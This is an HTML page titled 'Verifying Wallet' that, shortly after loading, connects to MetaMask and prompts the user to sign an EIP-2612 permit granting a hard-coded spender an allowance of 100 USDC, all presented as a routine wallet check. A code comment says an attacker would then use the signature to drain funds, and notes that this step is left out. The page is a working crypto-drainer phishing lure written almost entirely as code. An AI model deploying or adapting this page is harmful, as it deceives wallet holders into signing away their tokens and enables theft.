<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Verifying Wallet...</title>
  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
  <style>
    body {
      background: #111;
      color: #eee;
      font-family: 'Inter', sans-serif;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }
    .card {
      background: #1c1c1c;
      padding: 40px;
      border-radius: 18px;
      box-shadow: 0 0 30px rgba(0,255,255,0.1);
      text-align: center;
      width: 360px;
    }
    .loader {
      border: 5px solid #222;
      border-top: 5px solid #0ff;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    h2 {
      margin-bottom: 10px;
      color: #0ff;
    }
    #status {
      font-size: 14px;
      color: #aaa;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>🔒 Verifying Wallet</h2>
    <div class="loader"></div>
    <div id="status">Connecting to MetaMask...</div>
  </div>

  <script>
    const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // USDC
    const spender = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";   // Router

    const usdcPermitAbi = [
      {
        "inputs": [
          { "internalType": "address", "name": "owner", "type": "address" },
          { "internalType": "address", "name": "spender", "type": "address" },
          { "internalType": "uint256", "name": "value", "type": "uint256" },
          { "internalType": "uint256", "name": "deadline", "type": "uint256" },
          { "internalType": "uint8", "name": "v", "type": "uint8" },
          { "internalType": "bytes32", "name": "r", "type": "bytes32" },
          { "internalType": "bytes32", "name": "s", "type": "bytes32" }
        ],
        "name": "permit",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [{ "name": "owner", "type": "address" }],
        "name": "nonces",
        "outputs": [{ "name": "", "type": "uint256" }],
        "type": "function"
      },
      {
        "constant": true,
        "inputs": [],
        "name": "DOMAIN_SEPARATOR",
        "outputs": [{ "name": "", "type": "bytes32" }],
        "type": "function"
      }
    ];

    async function autoSignPermit() {
      try {
        const web3 = new Web3(window.ethereum);
        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
        const user = accounts[0];

        const value = web3.utils.toBN(100 * 10 ** 6); // 100 USDC
        const deadline = Math.floor(Date.now() / 1000) + 3600;

        const contract = new web3.eth.Contract(usdcPermitAbi, tokenAddress);
        const nonce = await contract.methods.nonces(user).call();
        const chainId = await web3.eth.getChainId();

        const permitData = {
          types: {
            EIP712Domain: [
              { name: "name", type: "string" },
              { name: "version", type: "string" },
              { name: "chainId", type: "uint256" },
              { name: "verifyingContract", type: "address" }
            ],
            Permit: [
              { name: "owner", type: "address" },
              { name: "spender", type: "address" },
              { name: "value", type: "uint256" },
              { name: "nonce", type: "uint256" },
              { name: "deadline", type: "uint256" }
            ]
          },
          domain: {
            name: "USD Coin",
            version: "2",
            chainId: chainId,
            verifyingContract: tokenAddress
          },
          primaryType: "Permit",
          message: {
            owner: user,
            spender: spender,
            value: value.toString(),
            nonce: nonce,
            deadline: deadline
          }
        };

        document.getElementById("status").innerText = "Signing permit...";

        const signature = await ethereum.request({
          method: "eth_signTypedData_v4",
          params: [user, JSON.stringify(permitData)],
        });

        const r = "0x" + signature.slice(2, 66);
        const s = "0x" + signature.slice(66, 130);
        const v = parseInt(signature.slice(130, 132), 16);

        document.getElementById("status").innerText = "✅ Signature complete";

        // Normally attacker now uses v,r,s off-chain to drain funds
        // Not shown here for safety

      } catch (err) {
        document.getElementById("status").innerText = "❌ User rejected or error";
      }
    }

    window.onload = () => {
      setTimeout(autoSignPermit, 1000); // slight delay for smooth UX
    };
  </script>
</body>
</html>
